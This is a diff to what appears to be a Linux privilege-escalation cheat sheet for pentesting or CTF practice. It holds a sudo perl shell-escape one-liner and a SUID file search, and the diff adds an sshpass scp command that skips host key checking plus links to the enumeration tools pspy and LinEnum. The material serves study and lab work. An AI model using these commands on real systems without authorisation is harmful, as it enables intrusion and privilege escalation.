@@ -41,6 +41,10 @@ echo “Reverse shell” > /dir/file
 ```vim
 sudo perl -e 'exec "/bin/sh";
 ```
+#### SSH
+```vim
+sshpass -p 'passwordOfUser' scp -oStrictHostKeyChecking=no User@IP:File
+```
 #### Binaries
 ```vim
 find / perm -u=s -type f 2>/dev/null
@@ -61,4 +65,11 @@ find / perm -u=s -type f 2>/dev/null
 
 > [Escritura Exploits (Español)](https://fundacion-sadosky.github.io/guia-escritura-exploits/)
 
-> []() 
+## Herramientas
+> [PsPy](https://github.com/DominicBreuker/pspy) 
+>
+> [LinEnum](https://github.com/rebootuser/LinEnum/)
+>
+> [PsPy64](https://f4d3.io/assets/downloads/linux/pspy64s) (grax f4d3 :D)
+>
+> []()
